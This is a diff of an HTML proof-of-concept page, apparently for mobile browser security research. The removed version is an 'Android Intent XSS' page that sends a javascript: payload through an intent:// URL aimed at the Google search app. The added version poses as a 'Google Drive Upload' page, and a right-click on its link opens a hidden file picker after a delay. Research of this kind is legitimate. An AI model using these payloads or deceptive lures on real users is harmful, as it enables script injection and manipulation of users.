@@ -1,131 +1,68 @@
-<!DOCTYPE html> 
-<html lang="en"> 
-<head> 
-<meta charset="UTF-8"> 
-<meta name="viewport" content="width=device-width, initial-scale=1"> 
-<title>Advanced Android Intent XSS PoC</title> 
-<style> 
-  body { 
-    font-family: system-ui, -apple-system, sans-serif; 
-    background: #f0f4f9; 
-    color: #202124; 
-    min-height: 100vh; 
-    margin: 0; 
-    display: flex; 
-    flex-direction: column; 
-    justify-content: center; 
-    align-items: center; 
-  } 
-  .card {
-    background: #ffffff;
-    padding: 40px;
-    border-radius: 12px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-    text-align: center;
-    max-width: 500px;
-    width: 90%;
-  }
-  h2 {
-    color: #d93025;
-    margin-top: 0;
-  }
-  p {
-    font-size: 14px;
-    color: #5f6368;
-    margin-bottom: 25px;
-  }
-  a.btn { 
-    display: inline-block; 
-    padding: 14px 24px; 
-    background: #d93025; 
-    color: white; 
-    text-decoration: none; 
-    font-weight: 600; 
-    border-radius: 8px; 
-    transition: background 0.2s;
-  } 
-  a.btn:active { 
-    background: #b31412; 
-  } 
-  .console-box {
-    margin-top: 20px;
-    background: #1e1e1e;
-    color: #00ff66;
-    padding: 12px;
-    border-radius: 6px;
-    font-family: 'Courier New', Courier, monospace;
-    font-size: 12px;
-    text-align: left;
-    height: 100px;
-    overflow-y: auto;
-  }
-</style> 
-</head> 
-<body> 
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google Drive Upload</title>
+<style>
+    h1 {
+        margin: 1em;
+    }
 
-<div class="card">
-    <h2>Android Intent XSS Vector</h2>
-    <p>Right-click (desktop) or long-press (mobile) the button below to simulate delayed Intent dispatch with script execution payload.</p>
-    
-    <a href="#" id="intentLink" class="btn"> 
-      Trigger Intent XSS Payload 
-    </a> 
+    a {
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 80;
+    }
 
-    <div id="logConsole" class="console-box">[SYSTEM] Initialized. Ready for gesture...</div>
-</div>
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
+</head>
+<body>
+<center>
+<br>
+<br>
+<br>
+<br>
+
+<a id="link" href="https://workspace.google.com/intl/en_in/products/drive/" > Right Click and Open in Split To Open Google Drive & Upload Fast</a>
+<br>
+<img id="img">
+
+</center>
+
+<input id="fileSelect" type="file" accept="image/*" />
+
+
 
 <script>
-let triggered = false;
-const link = document.getElementById("intentLink");
-const consoleBox = document.getElementById("logConsole");
+  document.getElementById('link').addEventListener('contextmenu', function(event) {
+    // Prevent the default browser context menu from appearing
 
-function log(msg) {
-    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
-    consoleBox.innerHTML += `\n[${timestamp}] ${msg}`;
-    consoleBox.scrollTop = consoleBox.scrollHeight;
-}
+setTimeout(function() {
 
-// Menangkap event interaksi pemicu (contextmenu / long-press)
-['contextmenu', 'mousedown', 'touchstart'].forEach(eventType => {
-    link.addEventListener(eventType, (e) => {
-        // Mencegah navigasi default link kosong
-        e.preventDefault();
-        
-        if (triggered) {
-            log("Already triggered, please wait...");
-            return;
-        }
-        triggered = true;
-        log(`Event (${eventType}) detected. Starting timer...`);
+         fileSelect.click();
 
-        setTimeout(() => {
-            log("Dispatching Android Intent with XSS / script payload...");
-            
-            // Konstruksi Intent URL yang menyertakan payload injeksi / javascript scheme 
-            // atau parameter query yang merefleksikan eksekusi skrip ke target handler.
-            // Contoh payload XSS berbasis parameter query atau direct javascript scheme:
-            const xssPayload = encodeURIComponent("javascript:alert(document.domain)");
-            
-            const intentUrl = `intent://www.google.com/hsi?name=Chrome&query=${xssPayload}&source=homescreen_shortcut#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end`;
-            
-            try {
-                // Eksekusi navigasi intent
-                window.location.href = intentUrl;
-                log("Intent dispatched successfully.");
-            } catch (err) {
-                log(`Dispatch failed: ${err.message}`);
-            }
 
-            // Reset status setelah beberapa detik
-            setTimeout(() => {
-                triggered = false;
-                log("State reset. Ready for next test.");
-            }, 2000);
-            
-        }, 3000); // Penyesuaian delay asinkron (3 detik)
-    });
-});
-</script> 
+fileSelect.onchange = (event) => {
+        img.src = URL.createObjectURL(fileSelect.files[0]);
+    }
 
-</body> 
+}, 4000);
+
+
+
+   
+  });
+</script>
+
+</body>
 </html>
+
+
+</style>
